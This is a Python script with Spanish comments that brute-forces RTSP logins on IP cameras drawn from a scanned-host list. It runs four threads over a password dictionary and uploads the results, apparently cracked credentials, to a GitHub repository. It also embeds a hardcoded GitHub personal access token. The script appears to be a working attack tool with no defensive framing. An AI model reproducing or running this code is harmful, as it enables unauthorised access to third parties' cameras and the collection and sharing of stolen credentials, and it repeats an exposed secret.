import os
import json
import time
import requests
import base64
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
from queue import Queue
from rtspBrute import RTSPBruteModule
from common import cargar_datos, actualizar_datos, guardar_datos

GITHUB_TOKEN = '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'
REPO_OWNER = 'TreonSearch'
REPO_NAME = 'Tron_Json'
FILE_PATH = 'datos.json'
FILE_NAME = 'datos.json'

def download_from_github():
    url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_NAME}'
    headers = {'Authorization': f'token {GITHUB_TOKEN}'}
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        remote_size = response.json()['size']
        print(f"Tamaño del archivo remoto: {remote_size} bytes")
        
        if os.path.exists(FILE_PATH):
            local_size = os.path.getsize(FILE_PATH)
            print(f"Tamaño del archivo local: {local_size} bytes")
            
            if remote_size > local_size:
                print("El archivo remoto es más grande que el local. Descargando...")
                download_url = response.json()['download_url']
                download_response = requests.get(download_url)
                with open(FILE_PATH, 'wb') as file:
                    file.write(download_response.content)
                print("Descarga completada.")
            else:
                print("El archivo local ya está actualizado. No es necesario descargar.")
        else:
            print("El archivo local no existe. Descargando...")
            download_url = response.json()['download_url']
            download_response = requests.get(download_url)
            with open(FILE_PATH, 'wb') as file:
                file.write(download_response.content)
            print("Descarga completada.")
    else:
        print(f"Error al obtener el archivo de GitHub: {response.content}")

def upload_to_github():
    if os.stat(FILE_PATH).st_size == 0:
        print(f"El archivo {FILE_NAME} está vacío. No se subirá.")
        return

    with open(FILE_PATH, 'r') as file:
        content = file.read()

    encoded_content = base64.b64encode(content.encode()).decode()

    url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_NAME}'
    headers = {'Authorization': f'token {GITHUB_TOKEN}'}
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        sha = response.json()['sha']
        remote_size = response.json()['size']
        local_size = os.path.getsize(FILE_PATH)
        print(f"Tamaño del archivo remoto: {remote_size} bytes")
        print(f"Tamaño del archivo local: {local_size} bytes")
        
        if local_size > remote_size:
            print("El archivo local es más grande que el remoto. Subiendo...")
            data = {
                'message': 'Actualización del archivo datos.json',
                'content': encoded_content,
                'sha': sha,
                'branch': 'main'
            }
            response = requests.put(url, headers=headers, json=data)
            if response.status_code in [200, 201]:
                print("Archivo subido/actualizado correctamente.")
            else:
                print(f"Error al subir el archivo: {response.content}")
        else:
            print("El archivo remoto ya está actualizado. No es necesario subir.")
    else:
        print("El archivo no existe en el repositorio. Subiendo por primera vez...")
        data = {
            'message': 'Subida del archivo datos.json',
            'content': encoded_content,
            'branch': 'main'
        }
        response = requests.put(url, headers=headers, json=data)
        if response.status_code in [200, 201]:
            print("Archivo subido correctamente.")
        else:
            print(f"Error al subir el archivo: {response.content}")


class NoCacheHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        try:
            super().do_GET()
        except ConnectionAbortedError:
            print("Se ha producido una conexión abortada por el cliente.")

    def end_headers(self):
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        super().end_headers()

def start_http_server():
    port = 8080
    server_address = ('', port)
    httpd = HTTPServer(server_address, NoCacheHandler)
    print(f'Servidor iniciado en http://127.0.0.1:{port}')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Servidor detenido.")
        httpd.server_close()

def brute_force_worker(q, dictionary_file):
    while True:
        target = q.get()
        if target is None:
            break
        ip, port = target
        brute = RTSPBruteModule()
        brute.setup(targets=[(ip, port)], dictionary_file=dictionary_file)
        brute.run()
        q.task_done()

if __name__ == '__main__':
    threading.Thread(target=actualizar_datos, daemon=True).start()

    server_thread = threading.Thread(target=start_http_server, daemon=True)
    server_thread.start()

    json_file = 'datos.json'

    # Descargar datos desde GitHub si es necesario
    download_from_github()

    # Cargar datos existentes
    data = cargar_datos()

    # Procesar objetivos
    targets = [(entry['IP'], entry['Puerto']) for entry in data if 'RTSP' in entry.get('Banner', '') or entry.get('Puerto') == 554]
    q = Queue()

    for target in targets:
        q.put(target)

    dictionary_file = "diccionario.txt"
    num_worker_threads = 4
    for _ in range(num_worker_threads):
        threading.Thread(target=brute_force_worker, args=(q, dictionary_file), daemon=True).start()

    q.join()

    # Guardar datos actualizados
    datos_guardados = guardar_datos(data)

    # Solo subir a GitHub si los datos se guardaron correctamente
    if datos_guardados:
        upload_to_github()

    server_thread.join()

